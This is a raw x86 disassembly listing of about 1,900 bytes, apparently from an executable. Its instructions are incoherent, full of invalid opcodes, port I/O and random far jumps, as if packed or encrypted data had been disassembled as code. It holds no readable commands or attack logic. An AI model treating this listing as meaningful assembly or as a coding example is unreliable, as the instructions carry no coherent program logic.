  41218d:	fimul  DWORD PTR [ecx-0x5]
  412190:	scas   eax,DWORD PTR es:[edi]
  412191:	dec    ebx
  412192:	xchg   esp,eax
  412193:	dec    ebx
  412194:	mov    edi,0xca538d02
  412199:	sub    ebx,DWORD PTR [esi+0x6c420dd]
  41219f:	jae    0x41212c
  4121a1:	sti    
  4121a2:	ret    
  4121a3:	add    BYTE PTR [ebx+0x47dbb66c],0xdd
  4121aa:	mov    ebx,0xe37f3360
  4121af:	out    dx,eax
  4121b0:	scas   al,BYTE PTR es:[edi]
  4121b1:	idiv   BYTE PTR [ebx]
  4121b3:	inc    ebp
  4121b4:	jb     0x4121d8
  4121b6:	push   es
  4121b7:	das    
  4121b8:	aas    
  4121b9:	lods   al,BYTE PTR ds:[esi]
  4121ba:	into   
  4121bb:	or     cl,BYTE PTR [ebx]
  4121bd:	bound  ecx,QWORD PTR [ecx]
  4121bf:	sbb    eax,DWORD PTR [esi+edi*2-0x56]
  4121c3:	pop    si
  4121c5:	inc    ebp
  4121c6:	dec    esi
  4121c7:	les    edx,FWORD PTR [ecx+0x1c]
  4121ca:	dec    BYTE PTR fs:[ecx-0x76]
  4121ce:	outs   dx,DWORD PTR ds:[esi]
  4121cf:	lods   al,BYTE PTR ds:[esi]
  4121d0:	xchg   esp,eax
  4121d1:	fimul  WORD PTR [edi-0xa]
  4121d4:	jp     0x412219
  4121d6:	sub    edx,DWORD PTR [edx+0x510612dd]
  4121dc:	jne    0x41222f
  4121de:	ror    BYTE PTR [eax+0x3c],0x48
  4121e2:	dec    ebx
  4121e3:	loopne 0x412189
  4121e5:	ins    BYTE PTR es:[edi],dx
  4121e6:	lods   al,BYTE PTR ds:[esi]
  4121e7:	adc    al,0x34
  4121e9:	sahf   
  4121ea:	dec    ecx
  4121eb:	fdivr  st(5),st
  4121ed:	les    ebx,FWORD PTR [edx+0x3d12d76c]
  4121f3:	inc    esp
  4121f4:	out    dx,al
  4121f5:	cli    
  4121f6:	xor    bh,BYTE PTR [ebp-0x5f60ee1e]
  4121fc:	les    ebp,FWORD PTR [ecx-0x4181b9fd]
  412202:	and    eax,0x420582fe
  412207:	xchg   ebx,eax
  412208:	jmp    0x412230
  41220a:	nop
  41220b:	ffree  st(5)
  41220d:	sub    BYTE PTR [eax-0x66],ch
  412210:	mov    eax,0x70abe64b
  412215:	mov    bh,0xf5
  412217:	pop    edi
  412218:	into   
  412219:	xchg   ebx,eax
  41221a:	inc    esp
  41221b:	jnp    0x41227d
  41221d:	cli    
  41221e:	or     ebx,DWORD PTR [edx+0x683685da]
  412224:	jbe    0x412200
  412226:	add    eax,DWORD PTR [eax+0x3b]
  412229:	(bad)  
  41222c:	stc    
  41222d:	popf   
  41222e:	xchg   esi,eax
  41222f:	xchg   ecx,eax
  412230:	sbb    BYTE PTR [edx-0x64],dl
  412233:	mov    bh,0xc1
  412235:	ds jg  0x412290
  412238:	jno    0x4121ff
  41223a:	inc    eax
  41223b:	inc    eax
  41223c:	add    eax,0x389849c4
  412241:	mov    bh,ah
  412243:	outs   dx,BYTE PTR ds:[esi]
  412244:	mov    ebx,0x5252f765
  412249:	xchg   ebx,eax
  41224a:	adc    eax,0xb82613ad
  41224f:	les    esp,FWORD PTR [esi+edx*8+0x47f0b9d5]
  412256:	pop    esp
  412257:	aaa    
  412258:	jmp    0xfcb1:0xe4a3b9f5
  41225f:	call   0x3ba3:0x932cb359
  412266:	push   ecx
  412267:	add    cl,BYTE PTR [ebx+0x37]
  41226a:	aad    0x1
  41226c:	cmp    BYTE PTR [ecx+0x47cce8dd],0x92
  412273:	jne    0x412239
  412275:	stos   DWORD PTR es:[edi],eax
  412276:	ret    0xff5a
  412279:	popa   
  41227a:	mov    eax,ds:0xc9f89c2f
  41227f:	mov    edi,0x969e3e97
  412284:	add    DWORD PTR [ecx+0x6f],edx
  412287:	jecxz  0x412298
  412289:	cs mov ecx,0xf7e07c0c
  41228f:	or     bl,BYTE PTR [ebp+0xeee2f74]
  412295:	cmp    BYTE PTR [ecx],ah
  412297:	or     al,0x79
  412299:	loop   0x4122cc
  41229b:	mov    BYTE PTR [esi-0x25],0xaf
  41229f:	mov    dl,0xc7
  4122a1:	mov    edi,DWORD PTR [ebp-0x6b748d5c]
  4122a7:	ins    DWORD PTR es:[edi],dx
  4122a8:	mov    bl,0x5d
  4122aa:	out    0xb4,al
  4122ac:	aas    
  4122ad:	pop    ebx
  4122ae:	mov    eax,0x7e1d1cfe
  4122b3:	test   al,0x1
  4122b5:	lods   al,BYTE PTR ds:[esi]
  4122b6:	dec    esp
  4122b7:	sub    ah,BYTE PTR [ebp+0x1d]
  4122ba:	mov    ah,0x7d
  4122bc:	imul   ebx,DWORD PTR [ecx-0x23828653],0x45c46ada
  4122c6:	out    dx,eax
  4122c7:	mov    eax,0x9993abe5
  4122cc:	adc    eax,0x3ab33569
  4122d1:	and    BYTE PTR [eax+0xeb0cf05],dh
  4122d7:	fs (bad) 
  4122d9:	inc    edi
  4122da:	xor    al,0xf8
  4122dc:	stos   DWORD PTR es:[edi],eax
  4122dd:	ins    BYTE PTR es:[edi],dx
  4122de:	xor    ebx,esp
  4122e0:	fsub   QWORD PTR [ebx-0x59d8e024]
  4122e6:	call   0x43056068
  4122eb:	mov    cl,0xe1
  4122ed:	mov    eax,0x3dff9c57
  4122f2:	into   
  4122f3:	sti    
  4122f4:	(bad)  
  4122f5:	imul   esi,DWORD PTR [esi],0xffffffa6
  4122f8:	pop    ds
  4122f9:	push   ebx
  4122fa:	cld    
  4122fb:	push   esi
  4122fc:	inc    ecx
  4122fd:	inc    edi
  4122fe:	pop    ss
  4122ff:	sub    al,0x4
  412301:	jl     0x41230b
  412303:	arpl   WORD PTR [edx-0xfe30117],cx
  412309:	inc    eax
  41230a:	push   ebp
  41230b:	(bad)  
  41230d:	test   eax,0x674b5d35
  412312:	sub    BYTE PTR [ecx-0x6bbf639a],0xf0
  412319:	cmp    eax,0x9c479e6d
  41231e:	fstp   TBYTE PTR [ecx-0x13]
  412321:	inc    ebp
  412322:	xchg   edx,eax
  412323:	mul    DWORD PTR [edx-0xc2c5ad]
  412329:	repz lahf 
  41232b:	inc    ebp
  41232c:	(bad)  
  41232e:	add    eax,0xf9bbb75e
  412333:	stos   DWORD PTR es:[edi],eax
  412334:	aaa    
  412335:	mov    al,0x42
  412337:	(bad)  
  412338:	popf   
  412339:	pop    ebx
  41233a:	cmp    al,0x46
  41233c:	mov    eax,ds:0xa8509203
  412341:	out    0x92,al
  412343:	sbb    BYTE PTR [edx-0x1f],bl
  412346:	mov    esp,0xee9a7731
  41234b:	jae    0x41238a
  41234d:	pushf  
  41234e:	mov    bl,BYTE PTR [esi+0x43]
  412351:	jp     0x412367
  412353:	xor    al,0xea
  412355:	cmc    
  412356:	(bad)  
  412357:	xor    al,0xe0
  412359:	add    eax,0xfa3d703c
  41235e:	mov    al,0x53
  412360:	(bad)  
  412361:	adc    eax,0xc72ca9f7
  412366:	inc    esp
  412367:	and    BYTE PTR [edx-0x729505c0],dl
  41236d:	add    edi,DWORD PTR [edi+0x69]
  412370:	adc    bh,ah
  412372:	jbe    0x412387
  412374:	cmp    edi,0x24
  412377:	sbb    BYTE PTR [edx],0x68
  41237a:	mov    edx,0x30bd1eb7
  41237f:	and    DWORD PTR [ebp+0x67],ebx
  412382:	es add bl,ch
  412385:	test   BYTE PTR [edi-0x2807b3aa],bh
  41238b:	inc    ebx
  41238c:	adc    al,0xa0
  41238e:	les    edx,FWORD PTR [eax+0x1e]
  412391:	push   edx
  412392:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412393:	mov    esi,0xd7cdd0a6
  412398:	imul   ecx,DWORD PTR [edx-0x26],0xffffffc5
  41239c:	cld    
  41239d:	sbb    eax,0x42ba53a5
  4123a2:	and    al,0x66
  4123a4:	mov    edi,0xf7e94181
  4123a9:	test   BYTE PTR ds:0x6e2a4677,dl
  4123af:	into   
  4123b0:	push   cs
  4123b1:	pop    ecx
  4123b2:	rcl    BYTE PTR [edi+0x2e769354],cl
  4123b8:	mov    esi,0x8cdf637
  4123bd:	adc    al,0xdf
  4123bf:	inc    esi
  4123c0:	jl     0x4123c4
  4123c2:	out    0xfa,eax
  4123c4:	or     BYTE PTR [eax+ebx*1+0x69],cl
  4123c8:	push   esp
  4123c9:	jno    0x412437
  4123cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123cc:	sub    BYTE PTR [edi-0x5364aa28],ah
  4123d2:	sahf   
  4123d3:	ja     0x41236f
  4123d5:	adc    eax,0xb311b43f
  4123da:	jmp    DWORD PTR [edi+0x3a]
  4123dd:	mov    fs,WORD PTR [ebx-0x12]
  4123e0:	sub    eax,0xf3b36a2c
  4123e5:	shr    BYTE PTR [ecx+0x36],cl
  4123e8:	nop
  4123e9:	sbb    ah,BYTE PTR [edi]
  4123eb:	dec    esp
  4123ec:	mov    esp,0x7dad3a3c
  4123f1:	out    0x38,al
  4123f3:	jne    0x4123ae
  4123f5:	shr    DWORD PTR [edx+edi*1-0x30],0xcc
  4123fa:	sbb    eax,esp
  4123fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4123fd:	mov    fs,edx
  4123ff:	leave  
  412400:	jg     0x4123c9
  412402:	jae    0x412437
  412404:	or     BYTE PTR [ebx],dl
  412406:	push   ebp
  412407:	pop    ebx
  412408:	pusha  
  412409:	daa    
  41240a:	enter  0x9c7b,0xe0
  41240e:	sbb    al,0x4
  412410:	(bad)  
  412411:	or     BYTE PTR [ebp-0x56666f20],ah
  412417:	mov    ebp,0x37dc3af
  41241c:	mov    ecx,0xea021a5c
  412421:	adc    edx,DWORD PTR [ecx-0x37c28c60]
  412427:	push   0xca7c54cf
  41242c:	jnp    0x4123af
  41242e:	jle    0x412448
  412430:	(bad)  
  412432:	pop    esi
  412433:	cld    
  412434:	leave  
  412435:	out    dx,eax
  412436:	inc    ebx
  412437:	sub    dl,dl
  412439:	imul   edx,eax,0xffffffc0
  41243c:	sub    ecx,esi
  41243e:	mov    eax,0xb33b829a
  412443:	xchg   ebx,eax
  412444:	xlat   BYTE PTR ds:[ebx]
  412445:	or     bh,BYTE PTR [esi+ecx*2+0x2042c3bc]
  41244c:	jg     0x412433
  41244e:	add    ch,BYTE PTR ds:0x733b39b4
  412454:	dec    edi
  412455:	pop    esp
  412456:	sub    cl,BYTE PTR [esi+eiz*2]
  412459:	mov    al,fs:0xd9f3495a
  41245f:	enter  0xde7e,0xc8
  412463:	jns    0x4123ef
  412465:	lea    esp,[edi]
  412467:	in     al,0x5c
  412469:	jg     0x41247c
  41246b:	fistp  DWORD PTR [ebp-0x419c597e]
  412471:	(bad)  
  412473:	rcr    cl,cl
  412475:	cmp    eax,0x23ee97cf
  41247a:	cld    
  41247b:	repnz shl BYTE PTR [esi-0x9],cl
  41247f:	rol    BYTE PTR [eax+0x62],0xc7
  412483:	scas   al,BYTE PTR es:[edi]
  412484:	push   ecx
  412485:	fcom   QWORD PTR [ebp-0x26ff5ad1]
  41248b:	jg     0x4124bd
  41248d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41248e:	pop    eax
  41248f:	fcmovu st,st(4)
  412491:	je     0x412431
  412493:	ret    
  412494:	shr    al,1
  412496:	scas   eax,DWORD PTR es:[edi]
  412497:	js     0x41241c
  412499:	mov    DWORD PTR [edi],eax
  41249b:	jne    0x412476
  41249d:	dec    edi
  41249e:	mov    dh,0x4
  4124a1:	xchg   DWORD PTR [ebx+0x77],edi
  4124a4:	cmp    al,0x7b
  4124a6:	das    
  4124a7:	add    edx,eax
  4124a9:	jg     0x41246e
  4124ab:	in     eax,dx
  4124ac:	jb     0x412471
  4124ae:	adc    eax,0x2a613520
  4124b3:	xchg   ecx,eax
  4124b4:	xchg   DWORD PTR [ebx],edx
  4124b6:	mov    eax,0x38c14055
  4124bb:	mov    dh,0xe2
  4124bd:	jecxz  0x41248f
  4124bf:	sbb    DWORD PTR cs:[ebx-0x39484fc5],edx
  4124c6:	xchg   edi,ebp
  4124c8:	in     al,0xa4
  4124ca:	pop    edx
  4124cb:	or     BYTE PTR [ecx+ebp*4+0x31d92659],dh
  4124d2:	add    eax,0x575e8ce5
  4124d7:	rcl    BYTE PTR [esi+0x2f8a1a0b],1
  4124dd:	call   0xba4a8aef
  4124e2:	mov    al,0x88
  4124e4:	and    BYTE PTR [ebp+0x44f8e066],al
  4124ea:	inc    edx
  4124eb:	add    DWORD PTR ds:0x4e02d099,edi
  4124f1:	ins    DWORD PTR es:[edi],dx
  4124f2:	mov    WORD PTR [edx-0x76],cs
  4124f5:	adc    BYTE PTR [ecx-0x5b2b298f],0x61
  4124fc:	push   ds
  4124fd:	inc    esi
  4124fe:	pop    es
  4124ff:	xor    al,0x32
  412501:	rcr    BYTE PTR [eax-0x24c33f27],0xba
  412508:	dec    esi
  412509:	mov    fs:0x673ca4fe,al
  41250f:	jnp    0x41249f
  412511:	std    
  412512:	lds    ebx,FWORD PTR [edi-0x21cdab28]
  412518:	jno    0x4124cd
  41251a:	jge    0x412564
  41251c:	lds    edi,FWORD PTR [ecx-0x37]
  41251f:	xor    eax,0xf66da4a2
  412524:	scas   eax,DWORD PTR es:[edi]
  412525:	ficomp WORD PTR [eax-0x5b]
  412528:	and    eax,0x4064363f
  41252d:	frstor [ebx-0x4996a1c1]
  412533:	push   edx
  412534:	lock dec edi
  412536:	test   eax,0x32ca49a1
  41253b:	sbb    DWORD PTR [edx+0x64],ebx
  41253e:	mov    edi,0x7ae122b0
  412543:	mov    cl,0x7e
  412545:	(bad)  
  412546:	mov    dl,0x84
  412548:	(bad)  
  412549:	leave  
  41254a:	and    eax,0x839c8927
  41254f:	(bad)  
  412550:	je     0x41256b
  412552:	stos   BYTE PTR es:[edi],al
  412553:	imul   edi,DWORD PTR [ecx-0x7b],0x46
  412557:	(bad)  
  412559:	cmp    al,0x81
  41255b:	cwde   
  41255c:	mov    ecx,0xeca10409
  412561:	push   es
  412562:	mov    al,fs:0xd07ca1ff
  412568:	in     eax,dx
  412569:	popa   
  41256a:	daa    
  41256b:	lds    esp,FWORD PTR [edx-0x16]
  41256e:	inc    eax
  41256f:	or     ebx,DWORD PTR [ebx]
  412571:	mov    al,ds:0xea8b862e
  412576:	rcr    edx,1
  412578:	push   ebx
  412579:	push   ebx
  41257a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41257b:	imul   al
  41257d:	pop    eax
  41257e:	adc    DWORD PTR [ebp-0x72a4b9f2],ebx
  412584:	sar    BYTE PTR [esi],1
  412586:	sub    esp,ebx
  412588:	aaa    
  412589:	lods   eax,DWORD PTR ds:[esi]
  41258a:	mov    bh,0xe0
  41258c:	pop    ecx
  41258d:	push   ebp
  41258e:	std    
  41258f:	cmp    al,0x53
  412591:	mul    BYTE PTR [esi+0x77f0a094]
  412597:	ret    
  412598:	in     al,dx
  412599:	fdivr  QWORD PTR [edx]
  41259b:	sar    ebx,0xec
  41259e:	in     eax,dx
  41259f:	sbb    esp,DWORD PTR [ecx-0x48cd3084]
  4125a5:	push   cs
  4125a6:	push   ss
  4125a7:	cli    
  4125a8:	cmp    esp,0xffffffd5
  4125ab:	outs   dx,BYTE PTR ds:[esi]
  4125ac:	repnz sbb BYTE PTR [ecx],bh
  4125af:	out    0x28,al
  4125b1:	retf   
  4125b2:	ja     0x412544
  4125b4:	not    BYTE PTR [edi]
  4125b6:	ss mov eax,0x76232e91
  4125bc:	push   cs
  4125bd:	inc    edi
  4125be:	scas   al,BYTE PTR es:[edi]
  4125bf:	aas    
  4125c0:	fstp   st(5)
  4125c2:	xor    ebx,DWORD PTR [ecx+esi*2]
  4125c5:	jb     0x41258e
  4125c7:	iret   
  4125c8:	loopne 0x4125f2
  4125ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125cb:	cmp    eax,0xdc295bb7
  4125d0:	test   DWORD PTR [esi+ecx*4],ecx
  4125d3:	sub    DWORD PTR [edx-0x40],0x683fdd27
  4125da:	adc    eax,0x2bb1fff1
  4125df:	ror    DWORD PTR [edx],1
  4125e1:	xor    edi,ecx
  4125e3:	sub    eax,0x33cf8df3
  4125e8:	jle    0x41264f
  4125ea:	arpl   WORD PTR [eax-0x14],bp
  4125ed:	sub    ebx,DWORD PTR [edx-0x3a]
  4125f0:	mov    DWORD PTR [ecx-0x7c],eax
  4125f3:	fstp   DWORD PTR [esi-0x5a]
  4125f6:	popa   
  4125f7:	xchg   ebp,eax
  4125f8:	(bad)  
  4125f9:	mov    al,ds:0xd38657e0
  4125fe:	ds ss cmp eax,eax
  412602:	sti    
  412603:	xor    dl,BYTE PTR [edx+0x6c]
  412606:	fsubrp st(1),st
  412608:	xchg   ecx,eax
  412609:	sbb    al,0x92
  41260b:	sbb    al,0x89
  41260d:	bswap  eax
  41260f:	adc    bh,BYTE PTR [esi+0x3866954e]
  412615:	adc    dh,cl
  412617:	mov    cl,0xcc
  412619:	and    al,0x6
  41261b:	ror    BYTE PTR [edi],1
  41261d:	loopne 0x412671
  41261f:	(bad)  
  412620:	dec    esp
  412621:	fnsave [ecx+0x7c]
  412624:	popf   
  412625:	cmp    BYTE PTR [edi-0x26],bh
  412628:	rcl    BYTE PTR [ecx+0x4fecbc46],1
  41262e:	pushf  
  41262f:	inc    esi
  412630:	arpl   WORD PTR [ebp+0x53],di
  412633:	call   0x16828c7a
  412638:	into   
  412639:	xchg   ebp,eax
  41263a:	aam    0x7e
  41263c:	mov    esp,0x9c9b5f35
  412641:	push   ebp
  412642:	inc    ebx
  412643:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412644:	clc    
  412645:	and    DWORD PTR [eax],ecx
  412647:	hlt    
  412648:	push   cs
  412649:	jp     0x41269b
  41264b:	nop
  41264c:	ret    
  41264d:	fisttp WORD PTR [edi-0x7683d92]
  412653:	dec    ecx
  412654:	cmp    al,0x11
  412656:	xlat   BYTE PTR ds:[ebx]
  412657:	rcl    BYTE PTR [esi-0x1a],1
  41265a:	and    ebx,eax
  41265c:	sahf   
  41265d:	adc    edx,DWORD PTR [ebp+0x64]
  412660:	or     al,0xdd
  412662:	xor    BYTE PTR [ebx],bl
  412664:	and    BYTE PTR [edx],ah
  412666:	adc    DWORD PTR [ebx],ebp
  412668:	push   0x53
  41266a:	lods   al,BYTE PTR ds:[esi]
  41266b:	imul   ebp,DWORD PTR [ebx-0x439239d7],0x789b1b86
  412675:	push   0x4fd953d9
  41267a:	test   eax,0x1bfbb3e1
  41267f:	retf   
  412680:	jno    0x4126fb
  412682:	add    ecx,DWORD PTR [eax]
  412684:	mov    al,ds:0x3f476f97
  412689:	lods   al,BYTE PTR ds:[esi]
  41268a:	or     dl,bh
  41268c:	daa    
  41268d:	mov    bh,0x28
  41268f:	pop    ss
  412690:	push   cs
  412691:	popf   
  412692:	jnp    0x4126a2
  412694:	mov    ds:0xa80125bc,al
  412699:	inc    esi
  41269a:	retf   
  41269b:	push   ebp
  41269c:	push   ss
  41269d:	inc    esp
  41269e:	in     eax,0xa0
  4126a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126a1:	ss int3 
  4126a3:	pusha  
  4126a4:	ds push ss
  4126a6:	outs   dx,DWORD PTR ds:[esi]
  4126a7:	adc    ah,BYTE PTR [edx-0x16]
  4126aa:	daa    
  4126ab:	mov    eax,ds:0x6b8af233
  4126b0:	or     DWORD PTR [edi-0x52023649],0x51
  4126b7:	mov    BYTE PTR [edi+0x367f1324],0xeb
  4126be:	inc    ebx
  4126bf:	xchg   BYTE PTR [ebx+ecx*8],al
  4126c2:	add    ebx,DWORD PTR [edx]
  4126c4:	(bad)  
  4126c5:	scas   al,BYTE PTR es:[edi]
  4126c6:	cmp    al,0x73
  4126c8:	fs int3 
  4126ca:	pop    ss
  4126cb:	(bad)  [esi]
  4126cd:	imul   eax,DWORD PTR [ebx-0xe],0x2092dc35
  4126d4:	rcr    BYTE PTR [ebx+edi*8+0x48],0x5b
  4126d9:	cmc    
  4126da:	loopne 0x41269a
  4126dc:	cmc    
  4126dd:	int    0x97
  4126df:	jnp    0x4126fd
  4126e1:	xchg   ebx,eax
  4126e2:	popa   
  4126e3:	enter  0xf9f2,0xb3
  4126e7:	hlt    
  4126e8:	sbb    dl,BYTE PTR [ebp+0x74]
  4126eb:	dec    ebp
  4126ec:	jmp    FWORD PTR [ebx]
  4126ee:	int    0xd8
  4126f0:	jg     0x4126b9
  4126f2:	jns    0x41267a
  4126f4:	adc    ebp,esp
  4126f6:	inc    edi
  4126f7:	mov    ds,WORD PTR [ebp+0x13935474]
  4126fd:	or     al,0xa2
  4126ff:	push   es
  412700:	xchg   ecx,eax
  412701:	inc    ebp
  412702:	repnz xor DWORD PTR [ecx+0x8],ebx
  412706:	data16 jle 0x41275f
  412709:	and    DWORD PTR [ebx],esi
  41270b:	ret    0xc75c
  41270e:	gs ds pop ebx
  412711:	dec    edx
  412712:	mov    ?,WORD PTR [edx-0x5b]
  412715:	mov    cl,0x75
  412717:	mov    ?,ebp
  412719:	jge    0x4126ea
  41271b:	stos   BYTE PTR es:[edi],al
  41271c:	inc    ebp
  41271d:	sbb    bh,BYTE PTR [eax-0xf]
  412720:	jecxz  0x412704
  412722:	pusha  
  412723:	and    edx,DWORD PTR [esi-0x35]
  412726:	fsub   DWORD PTR [esi+edi*8+0x58caa645]
  41272d:	mov    ds:0x9d3b0a45,eax
  412732:	add    DWORD PTR cs:[ebx+eiz*1],esp
  412736:	and    al,0x6b
  412738:	sbb    dl,dh
  41273a:	jb     0x412738
  41273c:	outs   dx,DWORD PTR ds:[esi]
  41273d:	push   esp
  41273e:	and    BYTE PTR [eax+0x23],0x14
  412742:	outs   dx,BYTE PTR ds:[esi]
  412743:	shr    ecx,cl
  412745:	mov    WORD PTR [esi],ds
  412747:	xor    eax,eax
  412749:	sbb    DWORD PTR [ebp+0x35eb4233],eax
  41274f:	sub    cl,bl
  412751:	mov    bl,0x3
  412753:	stos   DWORD PTR es:[edi],eax
  412754:	int3   
  412755:	call   0x1d90f719
  41275a:	ja     0x41277e
  41275c:	xor    al,0x5d
  41275f:	push   esp
  412760:	dec    ebx
  412761:	mov    bl,0x1f
  412763:	ins    BYTE PTR es:[edi],dx
  412764:	in     eax,dx
  412765:	jp     0x412713
  412767:	jmp    0x52f9:0x3b63f99b
  41276e:	add    al,0xbc
  412770:	and    DWORD PTR [esi+esi*8],0x69b7f7b6
  412777:	arpl   WORD PTR [eax+0x5],cx
  41277a:	push   ebp
  41277b:	retf   
  41277c:	arpl   WORD PTR [ecx-0x73],dx
  41277f:	jns    0x412756
  412781:	jge    0x4127dc
  412783:	push   eax
  412784:	hlt    
  412785:	aas    
  412786:	cmc    
  412787:	out    0xaa,al
  412789:	imul   esi,DWORD PTR [ecx+0x172d655],0xb718e88a
  412793:	ret    0x25a4
  412796:	dec    ecx
  412797:	mov    ch,0xe3
  412799:	ret    0xea5a
  41279c:	lods   eax,DWORD PTR ds:[esi]
  41279d:	in     al,0x4a
  41279f:	sbb    ch,BYTE PTR [ecx+0x54]
  4127a2:	jnp    0x4127c2
  4127a4:	push   ebp
  4127a5:	inc    esp
  4127a6:	bound  edi,QWORD PTR [eax-0x4f]
  4127a9:	loop   0x4127df
  4127ab:	mov    ds:0x62d54035,al
  4127b0:	and    edi,ecx
  4127b2:	xchg   ecx,eax
  4127b3:	jp     0x412815
  4127b5:	fisub  DWORD PTR [edx]
  4127b7:	push   edx
  4127b8:	and    al,0xf7
  4127ba:	mov    dh,0x94
  4127bc:	and    dh,BYTE PTR [esi]
  4127be:	and    al,0x8d
  4127c0:	mov    bl,BYTE PTR [ecx+0x120adf16]
  4127c6:	pop    ebx
  4127c7:	fisubr WORD PTR ds:0x96e5512c
  4127cd:	cmp    ch,ah
  4127cf:	jns    0x4127d1
  4127d1:	mov    ah,0x4
  4127d3:	mov    ch,0x1c
  4127d5:	xlat   BYTE PTR ds:[ebx]
  4127d6:	push   cs
  4127d7:	dec    ebp
  4127d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127da:	pop    edx
  4127db:	int    0x5c
  4127dd:	(bad)  
  4127de:	xor    al,0x5a
  4127e0:	test   eax,0x9b88c4c8
  4127e5:	sahf   
  4127e6:	pop    esi
  4127e7:	popf   
  4127e8:	iret   
  4127e9:	test   al,0xb0
  4127eb:	mov    ebp,0x1d305657
  4127f0:	adc    esp,edi
  4127f2:	jecxz  0x412856
  4127f4:	cmp    DWORD PTR [esi],esi
  4127f6:	mov    WORD PTR [esp+ecx*1],ds
  4127f9:	out    dx,eax
  4127fa:	dec    esp
  4127fb:	outs   dx,BYTE PTR ds:[esi]
  4127fc:	and    dl,BYTE PTR [edi]
  4127fe:	loop   0x4127cb
  412800:	cmp    cl,BYTE PTR [edi-0xc]
  412803:	jne    0x412866
  412805:	bswap  eax
  412807:	mov    esi,esi
  412809:	jecxz  0x4127cd
  41280b:	rcr    BYTE PTR [ebx],0x9d
  41280e:	cmp    DWORD PTR [ebp+edx*4-0x18],esp
  412812:	or     DWORD PTR [esi],ebp
  412814:	pop    esi
  412815:	xor    al,0xb4
  412817:	(bad)  
  412818:	jnp    0x412887
  41281a:	add    al,0x4e
  41281c:	inc    eax
  41281d:	fistp  WORD PTR [ecx+0x77faeca6]
  412823:	fild   QWORD PTR [edi+0xe]
  412826:	adc    eax,DWORD PTR [edi+ebp*2]
  412829:	test   BYTE PTR [ebp+0x1e],dh
  41282c:	add    cl,dl
  41282e:	sbb    BYTE PTR [esi+0x6d],0x40
  412832:	push   0x98a3a9a5
  412837:	cdq    
  412838:	xor    BYTE PTR [ebp-0x5f],ah
  41283b:	mov    esp,eax
  41283d:	pop    edx
  41283e:	clc    
  41283f:	mov    ah,0x28
  412841:	in     al,0x11
  412843:	aad    0x3
  412845:	icebp  
  412846:	adc    BYTE PTR [edx+0x7d715b26],ch
  41284c:	sub    eax,DWORD PTR [ebp+0x72b417ff]
  412852:	or     esp,DWORD PTR [esi-0x2037da0b]
  412858:	push   0x2f
  41285a:	push   ds
  41285b:	add    DWORD PTR [esi+ecx*2+0x7e2b4488],ecx
  412862:	dec    esp
  412863:	sbb    bh,ah
  412865:	lea    esp,[edi]
  412867:	jl     0x41288e
  412869:	std    
  41286a:	mov    al,ds:0xbae6c115
  41286f:	adc    eax,0x859cbe74
  412874:	jl     0x41283a
  412876:	fs sar ch,0x4
  41287a:	mov    ecx,edi
  41287c:	stc    
  41287d:	add    ch,bl
  41287f:	arpl   WORD PTR [edx-0x37ce8862],di
  412885:	xchg   ebp,eax
  412886:	inc    esp
  412887:	and    BYTE PTR [esi-0x3f],ah
  41288a:	or     bl,BYTE PTR [edx+0x34]
  41288d:	xchg   BYTE PTR [edx+0x6af2c202],ah
  412893:	mov    ah,0x7a
  412895:	and    al,0x19
  412897:	loop   0x412823
  412899:	not    BYTE PTR [esi]
  41289b:	fmul   DWORD PTR [esi]
  41289d:	lock push edi
  41289f:	pop    edi
  4128a0:	(bad)  
  4128a1:	lahf   
  4128a2:	xor    esi,DWORD PTR [esi+0x2c]
  4128a5:	inc    edi
  4128a6:	xor    bh,BYTE PTR [ebp+0x53]
  4128a9:	fld    QWORD PTR [edi]
  4128ab:	and    BYTE PTR [esi],ch
  4128ad:	out    dx,eax
  4128ae:	jmp    0xb4b21dc6
  4128b3:	lods   eax,DWORD PTR ds:[esi]
  4128b4:	jg     0x4128c3
  4128b6:	cmc    
  4128b7:	mov    BYTE PTR [ebp-0x527635b],bl
  4128bd:	inc    esp
  4128be:	in     al,dx
  4128bf:	addr16 push esi
  4128c1:	mov    ecx,0xf2bd3e5c
  4128c6:	and    al,0xd3
  4128c8:	mov    eax,DWORD PTR [eax+0x4b]
  4128cb:	push   esp
  4128cc:	jae    0x412890
  4128ce:	pop    ebx
  4128cf:	sbb    BYTE PTR ds:0xf4bf0c24,0x39
  4128d6:	dec    ebx
  4128d7:	inc    edi
  4128d8:	loopne 0x412863
  4128da:	mov    al,0xd5
  4128dc:	cld    
  4128dd:	dec    esp
  4128de:	inc    ecx
  4128df:	mov    dl,0xc4
  4128e1:	dec    eax
  4128e2:	bound  eax,QWORD PTR [edi+eiz*2]
  4128e5:	inc    esp
  4128e6:	mov    eax,ds:0x569459a4
  4128eb:	cmp    al,0x6f
  4128ed:	pop    eax
  4128ee:	jns    0x41293f
  4128f0:	fimul  DWORD PTR [ecx+0x61b4ef1c]
  4128f6:	dec    esi
  4128f7:	jo     0x412897
  4128f9:	mov    ebp,0xa5475964
  4128fe:	or     ebx,DWORD PTR [esi+0x400c589b]
  412904:	mov    DWORD PTR [edi-0x14],ebp
  412907:	jmp    0x4128ee
  412909:	fsubr  st(6),st
  41290b:	pop    eax
  41290c:	dec    ebx
  41290d:	(bad)  
  41290e:	shl    BYTE PTR [ecx+0x5ea302e3],0x70
  412915:	and    eax,0x9f9bfda0
  41291a:	bound  ebx,QWORD PTR [edi]
  41291c:	pop    esp
  41291d:	ror    bh,0x9
  412920:	pushf  
  412921:	outs   dx,DWORD PTR ds:[esi]
  412922:	inc    ebx
  412923:	arpl   WORD PTR [edx],bx
  412925:	or     bl,BYTE PTR [eax]
  412927:	push   ss
  412928:	mov    BYTE PTR [eax+0x27],al
  41292b:	popf   
  41292c:	inc    esi
  41292d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41292e:	outs   dx,BYTE PTR ds:[esi]
  41292f:	pop    esi
  412930:	std    
  412931:	mov    eax,ds:0x1b9b6aaf
  412936:	xor    eax,0x10ae51a
  41293b:	lods   eax,DWORD PTR ds:[esi]
  41293c:	pop    edx
